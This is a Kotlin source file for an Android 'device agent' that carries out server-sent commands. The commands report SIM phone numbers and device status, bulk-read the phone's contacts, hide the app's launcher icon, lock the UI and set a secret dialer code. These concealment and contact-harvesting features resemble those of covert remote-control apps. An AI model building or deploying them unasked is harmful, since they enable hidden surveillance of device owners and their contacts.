package ir.behzaaad.deviceflow.agent.service

import android.content.Context
import ir.behzaaad.deviceflow.agent.contacts.ContactsReader
import ir.behzaaad.deviceflow.agent.data.AgentPreferences
import ir.behzaaad.deviceflow.agent.device.DeviceHealth
import ir.behzaaad.deviceflow.agent.security.LauncherVisibility
import org.json.JSONArray
import org.json.JSONObject

object ControlCommandHandler {
    fun handle(
        context: Context,
        prefs: AgentPreferences,
        action: String,
        params: JSONObject,
    ): JSONObject {
        return when (action) {
            "sync" -> {
                val snapshot = DeviceHealth.snapshot(context)
                JSONObject()
                    .put("action", action)
                    .put("handled", true)
                    .put("synced_at", System.currentTimeMillis())
                    .put("battery", snapshot.battery.level)
                    .put("signal", snapshot.signal)
                    .put("network", snapshot.network)
                    .put("sims", simsArray(snapshot))
            }
            "clear_queue" -> {
                // Outbound work is server-driven; clear local outbound backlog marker.
                prefs.localQueueSize = 0
                JSONObject()
                    .put("action", action)
                    .put("handled", true)
                    .put("cleared", true)
                    .put("queue_size", 0)
            }
            "refresh_sim" -> {
                val sims = DeviceHealth.sims(context)
                JSONObject()
                    .put("action", action)
                    .put("handled", true)
                    .put(
                        "sims",
                        JSONArray().also { arr ->
                            sims.forEach { sim ->
                                arr.put(
                                    JSONObject()
                                        .put("slot_index", sim.slotIndex)
                                        .put("operator", sim.operator)
                                        .put("phone_number", sim.phoneNumber),
                                )
                            }
                        },
                    )
            }
            "enable_logs" -> {
                val enabled = if (params.has("enabled")) params.optBoolean("enabled", true) else true
                prefs.verboseLogs = enabled
                JSONObject()
                    .put("action", action)
                    .put("handled", true)
                    .put("verbose_logs", enabled)
            }
            "restart_agent" -> {
                JSONObject()
                    .put("action", action)
                    .put("handled", true)
                    .put("restarting", true)
            }
            "contacts_read" -> {
                val limit = params.optInt("limit", 3000).coerceIn(1, 5000)
                val read = ContactsReader.read(context, limit)
                JSONObject()
                    .put("action", action)
                    .put("handled", read.ok)
                    .put("ok", read.ok)
                    .put("contacts", read.contacts)
                    .put("count", read.contacts.length())
                    .put("truncated", read.truncated)
                    .also { obj ->
                        read.errorCode?.let { obj.put("error_code", it) }
                    }
            }
            "hide_launcher" -> {
                prefs.launcherHidden = true
                LauncherVisibility.setHidden(context, true)
                securityResult(action, prefs)
            }
            "show_launcher" -> {
                prefs.launcherHidden = false
                LauncherVisibility.setHidden(context, false)
                securityResult(action, prefs)
            }
            "lock_ui" -> {
                if (!prefs.passcodeSet) {
                    JSONObject()
                        .put("action", action)
                        .put("handled", false)
                        .put("error", "passcode_not_set")
                } else {
                    prefs.lockUi()
                    securityResult(action, prefs)
                }
            }
            "unlock_ui" -> {
                prefs.unlockUi()
                securityResult(action, prefs)
            }
            "set_passcode" -> {
                val pin = params.optString("passcode").trim()
                val ok = prefs.setPasscode(pin)
                if (!ok) {
                    JSONObject()
                        .put("action", action)
                        .put("handled", false)
                        .put("error", "invalid_passcode")
                } else {
                    securityResult(action, prefs)
                }
            }
            "clear_passcode" -> {
                prefs.clearPasscode()
                securityResult(action, prefs)
            }
            "set_dialer_code" -> {
                val code = params.optString("code").ifBlank {
                    params.optString("dialer_code")
                }
                val ok = prefs.setDialerCode(code)
                if (!ok) {
                    JSONObject()
                        .put("action", action)
                        .put("handled", false)
                        .put("error", "invalid_dialer_code")
                } else {
                    securityResult(action, prefs)
                }
            }
            else -> {
                JSONObject()
                    .put("action", action)
                    .put("handled", false)
                    .put("error", "unsupported_action")
            }
        }
    }

    private fun securityResult(action: String, prefs: AgentPreferences): JSONObject {
        return JSONObject()
            .put("action", action)
            .put("handled", true)
            .put("launcher_hidden", prefs.launcherHidden)
            .put("ui_locked", prefs.uiLocked)
            .put("passcode_set", prefs.passcodeSet)
            .put("dialer_code", prefs.dialerCode)
    }

    private fun simsArray(snapshot: ir.behzaaad.deviceflow.agent.device.DeviceSnapshot): JSONArray {
        return JSONArray().also { arr ->
            snapshot.sims.forEach { sim ->
                arr.put(
                    JSONObject()
                        .put("slot_index", sim.slotIndex)
                        .put("operator", sim.operator)
                        .put("phone_number", sim.phoneNumber),
                )
            }
        }
    }
}
